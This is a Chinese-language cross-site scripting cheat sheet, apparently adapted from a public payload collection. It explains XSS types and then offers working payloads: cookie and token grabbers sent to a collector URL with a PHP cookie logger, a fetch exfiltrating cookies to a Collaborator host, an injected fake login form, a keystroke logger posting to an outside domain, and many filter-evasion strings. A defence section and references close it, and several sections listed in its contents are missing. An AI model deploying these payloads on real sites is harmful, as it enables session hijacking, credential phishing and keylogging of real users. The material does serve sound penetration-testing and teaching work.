# 跨站脚本攻击 (XSS)

> 跨站脚本攻击（XSS）是一种常见于Web应用中的计算机安全漏洞。XSS使攻击者能够向其他用户查看的网页中注入客户端脚本。

## XSS 攻击原理

跨站脚本（XSS）是一种常见的Web安全漏洞，攻击者能够将恶意脚本注入到其他用户浏览的网页中。当受害者访问被注入恶意脚本的页面时，这些脚本会在其浏览器中执行，从而导致各种安全问题。

### 漏洞成因

1. **未经验证的用户输入**：应用程序直接将用户输入拼接到页面中
2. **缺乏输出编码**：未对输出到页面的数据进行适当的HTML编码
3. **不安全的JavaScript使用**：使用`innerHTML`、`document.write()`等不安全的DOM操作方法
4. **CSP配置不当**：内容安全策略（CSP）配置不完善或缺失

### 攻击面

- **反射型XSS**：恶意脚本来自用户的HTTP请求
- **存储型XSS**：恶意脚本存储在服务器上
- **DOM型XSS**：漏洞存在于客户端代码中
- **基于mXSS的XSS**：由于HTML解析差异导致的变异XSS
- **基于DOM Clobbering的XSS**：通过DOM属性覆盖实现攻击

### 影响

- 窃取用户会话Cookie和凭据
- 执行任意JavaScript代码
- 重定向到恶意网站
- 窃取敏感信息（如表单数据）
- 键盘记录
- 发起CSRF攻击

## 目录

- [方法学](#方法学)
- [概念验证](#概念验证)
    - [数据抓取器](#数据抓取器)
    - [CORS](#cors)
    - [界面伪装](#界面伪装)
    - [JavaScript键盘记录器](#javascript键盘记录器)
    - [其他方式](#其他方式)
- [识别XSS端点](#识别xss端点)
    - [工具](#工具)
- [HTML/应用中的XSS](#html应用中的xss)
    - [常见载荷](#常见载荷)
    - [使用HTML5标签的XSS](#使用html5标签的xss)
    - [使用远程JS的XSS](#使用远程js的xss)
    - [隐藏输入中的XSS](#隐藏输入中的xss)
    - [大写输出中的XSS](#大写输出中的xss)
    - [基于DOM的XSS](#基于dom的xss)
    - [JS上下文中的XSS](#js上下文中的xss)
- [URI包装器中的XSS](#uri包装器中的xss)
    - [javascript:包装器](#javascript包装器)
    - [data:包装器](#data包装器)
    - [vbscript:包装器](#vbscript包装器)
- [文件中的XSS](#文件中的xss)
    - [XML中的XSS](#xml中的xss)
    - [SVG中的XSS](#svg中的xss)
    - [Markdown中的XSS](#markdown中的xss)
    - [CSS中的XSS](#css中的xss)
- [PostMessage中的XSS](#postmessage中的xss)
- [盲注XSS](#盲注xss)
    - [XSS Hunter](#xss-hunter)
    - [其他盲注XSS工具](#其他盲注xss工具)
    - [盲注XSS端点](#盲注xss端点)
    - [小贴士](#小贴士)
- [变异XSS](#变异xss)
- [实验](#实验)
- [防御措施](#防御措施)
- [参考资料](#参考资料)

## 方法学

跨站脚本（XSS）是一种常见的Web应用安全漏洞。XSS允许攻击者将恶意代码注入网站，然后在访问该网站的任何人的浏览器中执行。这可能导致攻击者窃取敏感信息（如用户登录凭据）或执行其他恶意操作。

XSS攻击主要分为3种类型：

- **反射型XSS**：在反射型XSS攻击中，恶意代码嵌入在发送给受害者的链接中。当受害者点击链接时，代码在其浏览器中执行。例如，攻击者可以创建一个包含恶意JavaScript的链接，并通过电子邮件发送给受害者。当受害者点击该链接时，JavaScript代码在其浏览器中执行，使攻击者能够执行各种操作，例如窃取其登录凭据。

- **存储型XSS**：在存储型XSS攻击中，恶意代码存储在服务器上，每次访问易受攻击的页面时都会执行。例如，攻击者可以将恶意代码注入到博客文章的评论中。当其他用户查看该博客文章时，恶意代码在其浏览器中执行，使攻击者能够执行各种操作。

- **基于DOM的XSS**：当易受攻击的Web应用程序修改用户浏览器中的DOM（文档对象模型）时，就会发生基于DOM的XSS攻击。例如，当用户输入用于以某种方式更新页面的HTML或JavaScript代码时，就可能发生这种情况。在基于DOM的XSS攻击中，恶意代码不会发送到服务器，而是直接在用户的浏览器中执行。由于服务器没有恶意代码的任何记录，这使得检测和防止此类攻击变得困难。

为防止XSS攻击，正确验证和清理用户输入非常重要。这意味着确保所有输入都符合必要的标准，并删除任何可能危险的字符或代码。在将用户输入呈现到浏览器之前，转义其中的特殊字符也很重要，以防止浏览器将其解释为代码。

## 概念验证

利用XSS漏洞时，展示可能导致账户接管或敏感数据泄露的完整利用场景更为有效。与其简单地报告带有alert弹窗的XSS，不如尝试获取有价值的数据，如支付信息、个人身份信息（PII）、会话cookie或凭据。

### 数据抓取器

获取管理员cookie或敏感访问令牌，以下有效载荷将发送到受控页面。

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

将收集的数据写入文件。

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### CORS

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

### 界面伪装

利用XSS修改页面HTML内容以显示虚假登录表单。

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>请登录以继续</h1><form>用户名: <input type='text'>密码: <input type='password'></form><input value='提交' type='submit'>"
</script>
```

### JavaScript键盘记录器

收集敏感数据的另一种方法是设置JavaScript键盘记录器。

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

### 其他方式

更多利用方式请访问 [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [使用XSS和HTML5 Canvas截屏](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [JavaScript端口扫描器](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [网络扫描器](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [.NET Shell执行](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [重定向表单](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [播放音乐](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)

## 识别XSS端点

此有效载荷会在开发者控制台中打开调试器，而不是触发弹窗。

```javascript
<script>debugger;</script>
```

具有内容托管的现代应用程序可以使用[沙箱域][sandbox-domains]

> 安全地托管各种类型的用户生成内容。许多这些沙箱专门用于隔离用户上传的HTML、JavaScript或Flash小程序，并确保它们无法访问任何用户数据。

[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html

因此，最好使用`alert(document.domain)`或`alert(window.origin)`作为默认的XSS有效载荷，而不是`alert(1)`，以便了解XSS实际执行的上下文。

替代`<script>alert(1)</script>`的更好有效载荷：

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

虽然`alert()`对于反射型XSS很好，但对于存储型XSS来说可能会成为负担，因为每次执行都需要关闭弹窗，所以可以使用`console.log()`在开发者控制台中显示消息（不需要任何交互）。

示例：

```html
<script>console.log("测试来自XYZ页面搜索栏的XSS\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

参考资料：

- [Google Bughunter University - 沙箱域中的XSS](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
- [LiveOverflow视频 - 不要使用alert(1)进行XSS测试](https://www.youtube.com/watch?v=KHwVjzWei1c)
- [LiveOverflow博客文章 - 不要使用alert(1)进行XSS测试](https://liveoverflow.com/do-not-use-alert-1-in-xss/)

### 工具

大多数工具也适用于盲注XSS攻击：

- [XSSStrike](https://github.com/s0md3v/XSStrike): 非常受欢迎但维护不佳
- [xsser](https://github.com/epsylon/xsser): 利用无头浏览器检测XSS漏洞
- [Dalfox](https://github.com/hahwul/dalfox): 功能全面，由于使用Go实现而速度极快
- [XSpear](https://github.com/hahwul/XSpear): 类似于Dalfox，但基于Ruby
- [domdig](https://github.com/fcavallarin/domdig): 无头Chrome XSS测试器

## HTML/应用中的XSS

### 常见载荷

```javascript
// 基本载荷
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// 图片载荷
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// SVG载荷
<svg\x0Aonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
```

## 防御措施

### 输入验证
- 实施严格的输入验证，只允许预期的字符和格式
- 使用白名单验证方法，而不是黑名单
- 验证所有用户输入，包括表单字段、URL参数和HTTP头

### 输出编码
- 在将用户输入插入到HTML文档之前进行适当的HTML实体编码
- 根据上下文使用适当的编码函数（HTML、JavaScript、CSS、URL等）
- 使用安全的API，如`textContent`而不是`innerHTML`

### 内容安全策略 (CSP)
- 实施严格的CSP策略，限制脚本执行
- 使用`script-src 'self'`只允许同源脚本
- 避免使用`unsafe-inline`和`unsafe-eval`指令
- 报告违反CSP策略的行为

### HTTP安全头
- 设置`X-XSS-Protection: 1; mode=block`
- 设置`X-Content-Type-Options: nosniff`
- 设置`X-Frame-Options: DENY`
- 设置`Content-Security-Policy`头

### 安全开发实践
- 使用现代框架（如React、Angular、Vue）的内置XSS防护
- 避免使用`eval()`、`setTimeout(string)`、`setInterval(string)`等危险函数
- 使用模板引擎的安全功能，如自动转义
- 定期进行安全审计和代码审查

### 其他防护措施
- 实施Web应用防火墙（WAF）规则检测和阻止XSS攻击
- 使用CSP报告功能监控潜在的攻击尝试
- 对敏感操作实施二次验证
- 定期更新和修补所有依赖项

## 参考资料

- [XSS Filter Evasion Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [Content Security Policy (CSP) - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [DOM based XSS Prevention Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [XSS (Cross Site Scripting) Prevention Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [mXSS攻击：通过innerHTML变异攻击安全Web应用 - Mario Heiderich等 - 2013年9月26日](https://cure53.de/fp170.pdf)
- [百万网站上的postMessage XSS - Mathias Karlsson - 2016年12月15日](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
- [导致Google信息泄露的RPO - @filedescriptor - 2016年7月3日](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/)
- [秘密Web黑客知识：CTF作者讨厌的这些简单技巧 - Philippe Dourassov - 2024年5月13日](https://youtu.be/Sm4G6cAHjWM)
- [使用Marketo Forms XSS和postMessage框架跳转以及jQuery-JSONP窃取hackerone.com上的联系表单数据 - Frans Rosén - 2017年2月17日](https://hackerone.com/reports/207042)
